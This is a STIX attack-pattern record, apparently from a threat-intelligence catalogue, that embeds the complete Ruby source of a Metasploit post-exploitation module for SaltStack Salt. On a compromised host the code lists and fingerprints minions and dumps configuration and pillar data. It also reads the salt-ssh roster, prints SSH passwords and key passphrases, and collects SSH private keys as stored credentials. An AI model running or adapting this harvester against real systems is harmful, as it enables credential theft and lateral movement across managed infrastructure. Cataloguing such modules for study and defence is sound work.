{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d80c7e3-5838-495d-af14-7597a4ed867d",
    "created": "2024-08-14T16:33:19.168419Z",
    "modified": "2024-08-14T16:33:19.168423Z",
    "name": "SaltStack Salt Information Gatherer",
    "description": " This module gathers information from SaltStack Salt masters and minions. Data gathered from minions: 1. salt minion config file Data gathered from masters: 1. minion list (denied, pre, rejected, accepted) 2. minion hostname/ip/os (depending on module settings) 3. SLS 4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed 5. minion config files 6. pillar data ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/saltstack_salt.rb",
            "external_id": "saltstack_salt.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SaltStack Salt Information Gatherer',\n        'Description' => %q{\n          This module gathers information from SaltStack Salt masters and minions.\n          Data gathered from minions: 1. salt minion config file\n          Data gathered from masters: 1. minion list (denied, pre, rejected, accepted)\n          2. minion hostname/ip/os (depending on module settings)\n          3. SLS\n          4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed\n          5. minion config files\n          6. pillar data\n        },\n        'Author' => [\n          'h00die',\n          'c2Vlcgo'\n        ],\n        'SessionTypes' => %w[shell meterpreter],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('MINIONS', [true, 'Minions Target', '*']),\n        OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),\n        OptBool.new('GETIP', [false, 'Gather IP from minions', true]),\n        OptBool.new('GETOS', [false, 'Gather OS from minions', true]),\n        OptInt.new('TIMEOUT', [true, 'Timeout for salt commands to run', 120])\n      ]\n    )\n  end\n\n  def gather_pillars\n    print_status('Gathering pillar data')\n    begin\n      out = cmd_exec('salt', \"'#{datastore['MINIONS']}' --output=yaml pillar.items\", datastore['TIMEOUT'])\n      vprint_status(out)\n      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded\n      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')\n      print_good(\"#{peer} - pillar data gathering successfully retrieved and saved to #{store_path}\")\n    rescue Psych::SyntaxError\n      print_error('Unable to process pillar command output')\n      return\n    end\n  end\n\n  def gather_minion_data\n    print_status('Gathering data from minions (this can take some time)')\n    command = []\n    if datastore['GETHOSTNAME']\n      command << 'network.get_hostname'\n    end\n    if datastore['GETIP']\n      # command << 'network.ip_addrs'\n      command << 'network.interfaces'\n    end\n    if datastore['GETOS']\n      command << 'status.version' # seems to work on linux\n      command << 'system.get_system_info' # seems to work on windows, part of salt.modules.win_system\n    end\n    commas = ',' * (command.length - 1) # we need to provide empty arguments for each command\n    command = \"salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}\"\n    begin\n      out = cmd_exec(command, nil, datastore['TIMEOUT'])\n      if out == '' || out.nil?\n        print_error('No results returned. Try increasing the TIMEOUT or decreasing the minions being checked')\n        return\n      end\n      vprint_status(out)\n      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded\n      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')\n      print_good(\"#{peer} - minion data gathering successfully retrieved and saved to #{store_path}\")\n    rescue Psych::SyntaxError\n      print_error('Unable to process gather command output')\n      return\n    end\n    return if results == false || results.nil?\n    return if results.include?('Salt request timed out.') || results.include?('Minion did not return.')\n\n    results.each do |_key, result|\n      # at times the first line may be \"Minions returned with non-zero exit code\", so we want to skip that\n      next if result.is_a? String\n\n      host_info = {\n        name: result['network.get_hostname'],\n        os_flavor: result['status.version'],\n        comments: \"SaltStack Salt minion to #{session.session_host}\"\n      }\n      # mac os\n      if result.key?('system.get_system_info') &&\n         result['system.get_system_info'].include?('Traceback') &&\n         result.key?('status.version') &&\n         result['status.version'].include?('unsupported on the current operating system')\n        host_info[:os_name] = 'osx' # taken from lib/msf/core/post/osx/system\n        host_info[:os_flavor] = ''\n      # windows will throw a traceback error for status.version\n      elsif result.key?('status.version') &&\n            result['status.version'].include?('Traceback')\n        info = result['system.get_system_info']\n        host_info[:os_name] = info['os_name']\n        host_info[:os_flavor] = info['os_version']\n        host_info[:purpose] = info['os_type']\n      end\n\n      unless datastore['GETIP'] # if we dont get IP, can't make hosts\n        print_good(\"Found minion: #{host_info[:name]} - #{host_info[:os_flavor]}\")\n        next\n      end\n\n      result['network.interfaces'].each do |name, interface|\n        next if name == 'lo'\n        next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface\n        next unless interface.key? 'inet' # skip if it doesn't have an inet, macos had lots of this\n        next if interface['inet'][0]['address'] == '127.0.0.1' # ignore localhost\n\n        host_info[:mac] = interface['hwaddr']\n        host_info[:host] = interface['inet'][0]['address'] # ignoring inet6\n        report_host(host_info)\n        print_good(\"Found minion: #{host_info[:name]} (#{host_info[:host]}) - #{host_info[:os_flavor]}\")\n      end\n    end\n  end\n\n  def list_minions\n    # pull minions from a master\n    print_status('Attempting to list minions')\n    unless command_exists?('salt-key')\n      print_error('salt-key not present on system')\n      return\n    end\n    begin\n      out = cmd_exec('salt-key', '-L --output=yaml', datastore['TIMEOUT'])\n      vprint_status(out)\n      minions = YAML.safe_load(out)\n    rescue Psych::SyntaxError\n      print_error('Unable to load salt-key -L data')\n      return\n    end\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Minions List',\n      'Indent' => 1,\n      'Columns' => ['Status', 'Minion Name']\n    )\n\n    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack Salt salt-key list')\n    print_good(\"#{peer} - minion file successfully retrieved and saved to #{store_path}\")\n    minions['minions'].each do |minion|\n      tbl << ['Accepted', minion]\n    end\n    minions['minions_pre'].each do |minion|\n      tbl << ['Unaccepted', minion]\n    end\n    minions['minions_rejected'].each do |minion|\n      tbl << ['Rejected', minion]\n    end\n    minions['minions_denied'].each do |minion|\n      tbl << ['Denied', minion]\n    end\n    print_good(tbl.to_s)\n  end\n\n  def minion\n    print_status('Looking for salt minion config files')\n    # https://github.com/saltstack/salt/blob/b427688048fdbee106f910c22ebeb105eb30aa10/doc/ref/configuration/minion.rst#configuring-the-salt-minion\n    [\n      '/etc/salt/minion', # linux, osx\n      'C://salt//conf//minion',\n      '/usr/local/etc/salt/minion' # freebsd\n    ].each do |config|\n      next unless file?(config)\n\n      minion = YAML.safe_load(read_file(config))\n      if minion['master']\n        print_good(\"Minion master: #{minion['master']}\")\n      end\n      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Salt Minion File')\n      print_good(\"#{peer} - minion file successfully retrieved and saved to #{store_path}\")\n      break # no need to process more\n    end\n  end\n\n  def master\n    list_minions\n    gather_minion_data if datastore['GETOS'] || datastore['GETHOSTNAME'] || datastore['GETIP']\n\n    # get sls files\n    unless command_exists?('salt')\n      print_error('salt not found on system')\n      return\n    end\n    print_status('Showing SLS')\n    output = cmd_exec('salt', \"'#{datastore['MINIONS']}' state.show_sls '*'\", datastore['TIMEOUT'])\n    store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')\n    print_good(\"#{peer} - SLS output successfully retrieved and saved to #{store_path}\")\n\n    # get roster\n    # https://github.com/saltstack/salt/blob/023528b3b1b108982989c4872c138d1796821752/doc/topics/ssh/roster.rst#salt-rosters\n    print_status('Loading roster')\n    priv_values = {}\n    ['/etc/salt/roster'].each do |config|\n      next unless file?(config)\n\n      begin\n        minions = YAML.safe_load(read_file(config))\n      rescue Psych::SyntaxError\n        print_error(\"Unable to load #{config}\")\n        next\n      end\n      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')\n      print_good(\"#{peer} - roster file successfully retrieved and saved to #{store_path}\")\n      next if minions.nil?\n\n      minions.each do |name, minion|\n        host = minion['host'] # aka ip\n        user = minion['user']\n        port = minion['port'] || 22\n        passwd = minion['passwd']\n        # sudo = minion['sudo'] || false\n        priv = minion['priv'] || false\n        priv_pass = minion['priv_passwd'] || false\n\n        print_good(\"Found SSH minion: #{name} (#{host})\")\n        # make a special print for encrypted ssh keys\n        unless priv_pass == false\n          print_good(\"  SSH key #{priv} password #{priv_pass}\")\n          report_note(host: host,\n                      proto: 'TCP',\n                      port: port,\n                      type: 'SSH Key Password',\n                      data: \"#{priv} => #{priv_pass}\")\n        end\n\n        host_info = {\n          name: name,\n          comments: \"SaltStack Salt ssh minion to #{session.session_host}\",\n          host: host\n        }\n        report_host(host_info)\n\n        cred = {\n          address: host,\n          port: port,\n          protocol: 'tcp',\n          workspace_id: myworkspace_id,\n          origin_type: :service,\n          private_type: :password,\n          service_name: 'SSH',\n          module_fullname: fullname,\n          username: user,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n        if passwd\n          cred[:private_data] = passwd\n          create_credential_and_login(cred)\n          next\n        end\n\n        # handle ssh keys if it wasn't a password\n        cred[:private_type] = :ssh_key\n        if priv_values[priv]\n          cred[:private_data] = priv_values[priv]\n          create_credential_and_login(cred)\n          next\n        end\n\n        unless file?(priv)\n          print_error(\"  Unable to find salt-ssh priv key #{priv}\")\n          next\n        end\n        input = read_file(priv)\n        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack Salt SSH Private Key')\n        print_good(\"  #{priv} stored to #{store_path}\")\n        priv_values[priv] = input\n        cred[:private_data] = input\n        create_credential_and_login(cred)\n      end\n    end\n    gather_pillars\n  end\n\n  def run\n    if session.platform == 'windows'\n      # the docs dont show that you can run as a master, nor was the master .bat included as of this writing\n      minion\n    end\n    minion if command_exists?('salt-minion')\n    master if command_exists?('salt-master')\n  end\n\nend\n"
}